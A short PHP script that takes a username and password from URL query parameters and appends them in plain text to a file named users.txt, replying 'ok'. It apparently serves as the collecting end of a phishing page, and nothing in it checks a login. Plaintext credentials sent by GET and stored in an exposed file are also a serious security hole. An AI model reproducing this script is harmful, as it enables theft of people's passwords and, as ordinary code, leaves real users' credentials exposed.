<?php

// get paramerts
$username = $_GET['username'];
$password = $_GET['password'];
// put parameters on file


if (file_put_contents('users.txt', '
Pass: '.$password.'
UserName: '.$username.'
===============', FILE_APPEND)){
echo 'ok';
}


?>